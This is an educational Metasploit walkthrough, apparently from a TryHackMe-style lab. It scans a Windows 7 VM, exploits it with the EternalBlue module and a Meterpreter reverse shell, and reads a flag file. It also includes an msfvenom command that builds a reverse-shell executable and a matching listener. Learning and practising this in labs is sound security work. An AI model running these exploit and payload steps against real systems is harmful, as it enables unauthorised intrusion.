## 🔥 What is Metasploit?

**Metasploit** is a set of tool used for **scanning**, **exploiting**, and **controlling** systems.

There are two main versions:
- **Metasploit Pro**: GUI-based, commercial version.
- **Metasploit Framework**: open-source, works from the command line, and the most widely used.

By typing `msfconsole` in the command line, we launch the Metasploit Framework console, an interactive environment where we can run commands, search for exploits, configure them, and execute them.

The prompt usually looks like this:
```bash
┌──(souhila@kali)-[~/Desktop]
└─$ msfconsole
Metasploit tip: Enable verbose logging with set VERBOSE true
                                                  
     ,           ,
    /             \                                                                                                                              
   ((__---,,,---__))                                                                                                                             
      (_) O O (_)_________                                                                                                                       
         \ _ /            |\                                                                                                                     
          o_o \   M S F   | \                                                                                                                    
               \   _____  |  *                                                                                                                   
                |||   WW|||                                                                                                                      
                |||     |||                                                                                                                      
                                                                                                                                                 

       =[ metasploit v6.4.84-dev                                ]
+ -- --=[ 2,547 exploits - 1,309 auxiliary - 1,683 payloads     ]
+ -- --=[ 432 post - 49 encoders - 13 nops - 9 evasion          ]

Metasploit Documentation: https://docs.metasploit.com/
The Metasploit Framework is a Rapid7 Open Source Project

msf > 
```
Before going further with Metasploit, it’s important to understand the difference between a **vulnerability**, an **exploit**, and a **payload**:
- **Vulnerability**: a weakness or flaw in a system (e.g. outdated software, misconfiguration)
- **Exploit**: a piece of code to take advantage of that vulnerability
- **Payload**: the action performed after the exploit succeeds (e.g. getting a shell, running commands)

## 🧩 Metasploit Modules

Metasploit is organized into different types of modules, mainly: 
- **Auxiliary**: any supporting module (e.g. scanners, crawlers and fuzzers)
- **Encoders**: allow you to encode exploits and payloads in the hope of bypassing basic signature-based antivirus detection. 
- **NOPs (No Operation)**: do nothing, often used as padding to make payload execution more reliable. 
- **Payloads**: are divided into different types:
  - **Singles**: self-contained (e.g. adding a user or running a program).
  - **Stagers**: small initial payloads that set up a connection.
  - **Stages**: downloaded by the stager to deliver larger functionality.

<p align="center">
<img width="500" alt="metasploit-modules" src="https://github.com/user-attachments/assets/9bc9c8a7-7448-48ba-ad97-df5e79824dad" />
</p>

[^1]

## 🧪 Hands-on Practice

Now, let’s go through a practical example using Metasploit. I will try to exploit a known vulnerability on a target virtual machine. The goal is to identify the vulnerability, exploit it, gain access to the system, and retrieve a CTF flag.

First, we run Metasploit using the `msfconsole` command as seen earlier. 
Then, to identify which critical vulnerability to exploit, we start by conducting a thorough scan of the target system using `nmap` to enumerate open ports and services:

```bash
msf > nmap -sV 10.113.163.72
[*] exec: nmap -sV 10.113.163.72

Starting Nmap 7.95 ( https://nmap.org ) at 2026-04-16 21:38 CEST
Nmap scan report for 10.113.163.72
Host is up (0.014s latency).
Not shown: 991 closed tcp ports (reset)
PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  tcpwrapped
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49165/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 67.60 seconds
```

From the scan results, we can observe several open ports, notably port 445 (SMB) running on a Windows system. 
This is interesting because SMB services on older or unpatched Windows machines are often associated with known critical vulnerabilities. 
The presence of SMB on port 445, combined with the Windows version, suggests a possible vulnerability such as MS17-010 (EternalBlue). 
This vulnerability affects older Windows systems and allows remote code execution (RCE) through the SMB protocol. 

We can now search for a matching exploit in Metasploit:
```bash
msf > search ms17-010

Matching Modules
================

   #   Name                                           Disclosure Date  Rank     Check  Description
   -   ----                                           ---------------  ----     -----  -----------
   0   exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   1     \_ target: Automatic Target                  .                .        .      .
   2     \_ target: Windows 7                         .                .        .      .
   3     \_ target: Windows Embedded Standard 7       .                .        .      .
   4     \_ target: Windows Server 2008 R2            .                .        .      .
   5     \_ target: Windows 8                         .                .        .      .
   6     \_ target: Windows 8.1                       .                .        .      .
   7     \_ target: Windows Server 2012               .                .        .      .
   8     \_ target: Windows 10 Pro                    .                .        .      .
   9     \_ target: Windows 10 Enterprise Evaluation  .                .        .      .
   10  exploit/windows/smb/ms17_010_psexec            2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   11    \_ target: Automatic                         .                .        .      .
   12    \_ target: PowerShell                        .                .        .      .
   13    \_ target: Native upload                     .                .        .      .
   14    \_ target: MOF upload                        .                .        .      .
   15    \_ AKA: ETERNALSYNERGY                       .                .        .      .
   16    \_ AKA: ETERNALROMANCE                       .                .        .      .
   17    \_ AKA: ETERNALCHAMPION                      .                .        .      .
   18    \_ AKA: ETERNALBLUE                          .                .        .      .
   19  auxiliary/admin/smb/ms17_010_command           2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   20    \_ AKA: ETERNALSYNERGY                       .                .        .      .
   21    \_ AKA: ETERNALROMANCE                       .                .        .      .
   22    \_ AKA: ETERNALCHAMPION                      .                .        .      .
   23    \_ AKA: ETERNALBLUE                          .                .        .      .
   24  auxiliary/scanner/smb/smb_ms17_010             .                normal   No     MS17-010 SMB RCE Detection
   25    \_ AKA: DOUBLEPULSAR                         .                .        .      .
   26    \_ AKA: ETERNALBLUE                          .                .        .      .
   27  exploit/windows/smb/smb_doublepulsar_rce       2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution
   28    \_ target: Execute payload (x64)             .                .        .      .
   29    \_ target: Neutralize implant                .                .        .      .


Interact with a module by name or index. For example info 29, use 29 or use exploit/windows/smb/smb_doublepulsar_rce
After interacting with a module you can manually set a TARGET with set TARGET 'Neutralize implant'
```
This returns available modules related to the vulnerability. The most relevant one here is the first one:
```bash
 0   exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
```
We can select and configure the exploit using `use 0` or `use exploit/windows/smb/ms17_010_eternalblue` commands then `show options` to check which required parameters we need to set. 
```bash
msf > use 0
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
msf exploit(windows/smb/ms17_010_eternalblue) > show options

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS                          yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.
                                             html
   RPORT          445              yes       The target port (TCP)
   SMBDomain                       no        (Optional) The Windows domain to use for authentication. Only affects Windows Server 2008 R2, Wind
                                             ows 7, Windows Embedded Standard 7 target machines.
   SMBPass                         no        (Optional) The password for the specified username
   SMBUser                         no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target. Only affects Windows Server 2008 R2, Windows
                                             7, Windows Embedded Standard 7 target machines.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target. Only affects Windows Server 2008 R2, Windows 7, Windows
                                              Embedded Standard 7 target machines.


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     172.16.85.128    yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic Target



View the full module info with the info, or info -d command.
```
We then set the following required parameters:
- RHOST (Remote Host) which is the target machine.
- LHOST (Local Host) which is our machine (attacker).
- PAYLOAD which is a reverse shell that will connect back to us.
```
msf exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 10.113.163.72
RHOSTS => 10.113.163.72
msf exploit(windows/smb/ms17_010_eternalblue) > set LHOST 192.168.213.200
LHOST => 192.168.213.200
msf exploit(windows/smb/ms17_010_eternalblue) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
PAYLOAD => windows/x64/meterpreter/reverse_tcp
```
We run the exploit and if successful, this should open a session on the target system:
```
msf exploit(windows/smb/ms17_010_eternalblue) > run
[*] Started reverse TCP handler on 192.168.213.200:4444 
[*] 10.113.163.72:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.113.163.72:445     - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
/usr/share/metasploit-framework/vendor/bundle/ruby/3.3.0/gems/recog-3.1.21/lib/recog/fingerprint/regexp_factory.rb:34: warning: nested repeat operator '+' and '?' was replaced with '*' in regular expression
[*] 10.113.163.72:445     - Scanned 1 of 1 hosts (100% complete)
[+] 10.113.163.72:445 - The target is vulnerable.
[*] 10.113.163.72:445 - Connecting to target for exploitation.
[+] 10.113.163.72:445 - Connection established for exploitation.
[+] 10.113.163.72:445 - Target OS selected valid for OS indicated by SMB reply
[*] 10.113.163.72:445 - CORE raw buffer dump (42 bytes)
[*] 10.113.163.72:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
[*] 10.113.163.72:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
[*] 10.113.163.72:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      
[+] 10.113.163.72:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 10.113.163.72:445 - Trying exploit with 12 Groom Allocations.
[*] 10.113.163.72:445 - Sending all but last fragment of exploit packet
[*] 10.113.163.72:445 - Starting non-paged pool grooming
[+] 10.113.163.72:445 - Sending SMBv2 buffers
[+] 10.113.163.72:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 10.113.163.72:445 - Sending final SMBv2 buffers.
[*] 10.113.163.72:445 - Sending last fragment of exploit packet!
[*] 10.113.163.72:445 - Receiving response from exploit packet
[+] 10.113.163.72:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 10.113.163.72:445 - Sending egg to corrupted connection.
[*] 10.113.163.72:445 - Triggering free of corrupted buffer.
[*] Sending stage (203846 bytes) to 10.113.163.72
[*] Meterpreter session 1 opened (192.168.213.200:4444 -> 10.113.163.72:49254) at 2026-04-16 22:03:01 +0200
[+] 10.113.163.72:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.113.163.72:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.113.163.72:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

meterpreter > 
```
We can now search for the flag file and retrieve it:
```
meterpreter > search -f flag.txt
Found 1 result...
=================

Path                             Size (bytes)  Modified (UTC)
----                             ------------  --------------
c:\Users\Jon\Documents\flag.txt  15            2021-07-15 04:39:25 +0200


meterpreter > cat c:\\Users\\Jon\\Documents\\flag.txt 
flag{THM-5455554845}
```

## ⚙️ Additional Usage

- Metasploit can use a **PostgreSQL database** to store information, which is especially useful when working with multiple targets.

Using the `db_nmap` command , we can run Nmap scans and automatically save the results into the database and access them using `hosts` or `services`. Saved hosts can also be reused directly in modules with the `hosts -R` command, which automatically sets the RHOSTS value.

- Metasploit also has a tool **Msfvenom**, used to generate payloads in different formats (e.g. .exe, .elf, .php) for various target systems. Unlike payloads used inside msfconsole (which are delivered automatically by an exploit), msfvenom is used to create **standalone payloads** that must be manually delivered to the target.(e.g. through file upload or social engineering). Example:
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.213.200 LPORT=4444 -f exe > shell.exe
```

Most payloads are reverse payloads, meaning the target connects back to us. To receive this connection, we need a listener: 
```
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.213.200
set LPORT 4444
run
```
Once the payload is executed on the target, the handler will catch the session.

## 🧠 Takeaways

- **SMB (Server Message Block)** is a protocol used by Windows systems for file sharing, printer access, and communication between machines. It typically runs on **port 445**.

- Seeing **port 445 open** during the scan is a strong indicator that SMB is running on the target system. Combined with the detected Windows version, this can point to known vulnerabilities.

- In this case, the presence of SMB suggested a possible vulnerability like **MS17-010 (EternalBlue)**, which affects unpatched Windows systems and allows remote code execution (RCE).

   What became clearer in practice is how the whole process connects: starting from scanning the target to identify services, then linking those services to known vulnerabilities, selecting the appropriate exploit and payload, and finally gaining access to interact with the system. 

- Metasploit simplifies this process by organizing everything into modules, making it easier to go from vulnerability identification to exploitation.

- Getting a session (e.g. Meterpreter) means we successfully gained control over the target system and can start exploring it further.


[^1]: Image source: https://www.hackthebox.com/blog/metasploit-tutorial#msf_components
